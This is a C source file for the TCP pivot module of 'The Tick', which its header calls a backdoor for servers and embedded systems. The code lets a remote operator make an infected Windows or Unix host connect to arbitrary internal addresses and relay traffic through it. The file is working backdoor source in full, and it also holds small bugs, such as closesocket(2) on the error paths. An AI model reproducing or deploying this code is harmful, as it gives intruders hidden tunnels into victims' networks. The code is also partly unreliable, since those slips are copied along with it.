/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include "pivot.h"

#include "tcp.h"
#include "stream.h"

// Ugly Windows version.
#ifdef _WIN32

typedef struct{
    int src;
    int dst;
} _stub_pivot_thread_params;

DWORD WINAPI _stub_copy_socket_stream(LPVOID lpParam);

void do_tcp_pivot(Parser *p)
{
    int sock = -1;
    CMD_TCP_PIVOT_ARGS *pivot = (CMD_TCP_PIVOT_ARGS *) p->buffer;
    struct sockaddr_in sa;
    _stub_pivot_thread_params *thread_args_1 = NULL;
    _stub_pivot_thread_params *thread_args_2 = NULL;
    HANDLE hHeap = GetProcessHeap();
    HANDLE hThread_1 = INVALID_HANDLE_VALUE;
    HANDLE hThread_2 = INVALID_HANDLE_VALUE;

    // Read the TCP pivot options structure.
    if (p->header.cmd_len != sizeof(CMD_TCP_PIVOT_ARGS) || parser_read_first_arg(p, (char *) &p->buffer, sizeof(CMD_TCP_PIVOT_ARGS)) < 0) {
        LOG("Malformed TCP pivot request\n");
        parser_error(p, "malformed request");
        parser_close(p);
        return;
    }

    // Disable this command if SSL is enabled.
    // This is tricky to implement so I'm leaving it for later.
#ifndef TICK_FEATURES_NO_CRYPTO
    if (p->use_ssl) {
        LOG("TODO implement do_tcp_pivot() on SSL connections\n");
        parser_error(p, "operation not yet supported on encrypted connections");
        return;
    }
#endif

    // Connect to the target IP and port.
    sock = create_socket(AF_INET);
    memset((void *) &sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    if (pivot->from_port != 0) {
        sa.sin_port = pivot->from_port;
        bind(sock, (const struct sockaddr *) &sa, sizeof(sa));
    }
    sa.sin_port = pivot->port;
    memcpy((void *) &sa.sin_addr, (void *) &pivot->ip, sizeof(sa.sin_addr));
    if (pivot->from_port != 0) {
        LOG("Pivoting to %s:%d from port %d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port), ntohs(pivot->from_port));
    } else {
        LOG("Pivoting to %s:%d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port));
    }
    if (connect_socket(sock, (const struct sockaddr *) &sa, sizeof(sa)) < 0) {
        if (pivot->from_port != 0) {
            LOG("Can not connect to %s:%d from port %d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port), ntohs(pivot->from_port));
        } else {
            LOG("Can not connect to %s:%d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port));
        }
        parser_error(p, "connection refused");
        return;
    }

    // The background threads will need to know the handles.
    // For memory safety we need to use the heap for this.
    thread_args_1 = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(HANDLE) * 2);
    thread_args_2 = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(HANDLE) * 2);
    if (thread_args_1 == NULL || thread_args_2 == NULL) {
        HeapFree(hHeap, 0, thread_args_1);
        HeapFree(hHeap, 0, thread_args_2);
        shutdown(sock, 2);
        closesocket(2);
        parser_error(p, "memory error");
        return;
    }

    // Create the background threads that will do the pivoting.
    thread_args_1->src = sock;
    thread_args_1->dst = p->fd;
    thread_args_2->src = p->fd;
    thread_args_2->dst = sock;
    hThread_1 = CreateThread(NULL, 0, &_stub_copy_socket_stream, thread_args_1, CREATE_SUSPENDED, NULL);
    hThread_2 = CreateThread(NULL, 0, &_stub_copy_socket_stream, thread_args_2, CREATE_SUSPENDED, NULL);
    if (hThread_1 == NULL || hThread_2 == NULL) {
        TerminateThread(hThread_1, 0);
        TerminateThread(hThread_2, 0);
        CloseHandle(hThread_1);
        CloseHandle(hThread_2);
        HeapFree(hHeap, 0, thread_args_1);
        HeapFree(hHeap, 0, thread_args_2);
        shutdown(sock, 2);
        closesocket(2);
        parser_error(p, "error creating threads");
        return;
    }

    // Everything seems to be in order at this point.
    // Send the OK status before launching the tunnel, since we'll be reusing the channel.
    parser_ok(p);

    // Resume execution in all the threads.
    // We don't check for errors here because if there is one, there's nothing to do.
    ResumeThread(hThread_1);
    ResumeThread(hThread_2);

    // Close the thread handles.
    // The heap allocated memory is freed by the threads.
    // The socket is closed when the pivot connection ends.
    CloseHandle(hThread_1);
    CloseHandle(hThread_2);

    // Log the event.
    if (pivot->from_port != 0) {
        LOG("Launched TCP tunnel to %s:%d from port %d\n", inet_ntoa(sa.sin_addr), pivot->port, pivot->from_port);
    } else {
        LOG("Launched TCP tunnel to %s:%d\n", inet_ntoa(sa.sin_addr), pivot->port);
    }

    // Our protocol parser will "forget" the socket, forcing a reconnect.
    // We do not actually close the socket since it's still in use.
    p->fd = -1;
    parser_close(p);
}

DWORD WINAPI _stub_copy_socket_stream(LPVOID lpParam)
{
    // Fetch the arguments and free the memory.
    _stub_pivot_thread_params *thread_args = lpParam;
    int src = thread_args->src;
    int dst = thread_args->dst;
    HeapFree(GetProcessHeap(), 0, lpParam);

    // Copy the socket streams.
    copy_stream(src, STREAM_SOCKET, dst, STREAM_SOCKET, -1);

    // Close all the sockets and exit.
    shutdown(src, 2);
    shutdown(dst, 2);
    closesocket(src);
    closesocket(dst);
    ExitThread(0);
}

// Beautiful Unix version.
#else

void do_tcp_pivot(Parser *p)
{
    int sock = -1;
    CMD_TCP_PIVOT_ARGS *pivot = (CMD_TCP_PIVOT_ARGS *) p->buffer;
    struct sockaddr_in sa;

    // Read the TCP pivot options structure.
    if (p->header.cmd_len != sizeof(CMD_TCP_PIVOT_ARGS) || parser_read_first_arg(p, (char *) &p->buffer, sizeof(CMD_TCP_PIVOT_ARGS)) < 0) {
        LOG("Malformed TCP pivot request\n");
        parser_error(p, "malformed request");
        parser_close(p);
        return;
    }

    // Disable this command if SSL is enabled.
    // This is tricky to implement so I'm leaving it for later.
#ifndef TICK_FEATURES_NO_CRYPTO
    if (p->use_ssl) {
        LOG("TODO implement do_tcp_pivot() on SSL connections\n");
        parser_error(p, "operation not yet supported on encrypted connections");
        return;
    }
#endif

    // Connect to the target IP and port.
    sock = create_socket(AF_INET);
    memset((void *) &sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    if (pivot->from_port != 0) {
        sa.sin_port = pivot->from_port;
        bind(sock, (const struct sockaddr *) &sa, sizeof(sa));
    }
    sa.sin_port = pivot->port;
    memcpy((void *) &sa.sin_addr, (void *) &pivot->ip, sizeof(sa.sin_addr));
    if (pivot->from_port != 0) {
        LOG("Pivoting to %s:%d from port %d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port), ntohs(pivot->from_port));
    } else {
        LOG("Pivoting to %s:%d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port));
    }
    if (connect_socket(sock, (const struct sockaddr *) &sa, sizeof(sa)) < 0) {
        if (pivot->from_port != 0) {
            LOG("Can not connect to %s:%d from port %d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port), ntohs(pivot->from_port));
        } else {
            LOG("Can not connect to %s:%d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port));
        }
        parser_error(p, "connection refused");
        return;
    }

    // Send the OK status before launching the tunnel, since we'll be reusing the channel.
    parser_ok(p);

    // Fork the process twice.
    if (fork() == 0) {
        if (fork() == 0) {

            // The first process will handle the source to destination data.
            copy_stream(p->fd, STREAM_SOCKET, sock, STREAM_SOCKET, -1);

        } else {

            // The second process will handle the destination to source data.
            copy_stream(sock, STREAM_SOCKET, p->fd, STREAM_SOCKET, -1);

        }

        // Both processes will kill their sockets and quit.
        disconnect_tcp(p->fd);
        disconnect_tcp(sock);
        exit(0);

    } else {

        // Log the event.
        if (pivot->from_port != 0) {
            LOG("Launched TCP tunnel to %s:%d from port %d\n", inet_ntoa(sa.sin_addr), pivot->port, pivot->from_port);
        } else {
            LOG("Launched TCP tunnel to %s:%d\n", inet_ntoa(sa.sin_addr), pivot->port);
        }

        // Close the socket object and reconnect.
        // Do not shutdown! The parent process still uses this connection.
        close(p->fd);
        p->fd = -1;
        parser_close(p);

    }
}

#endif
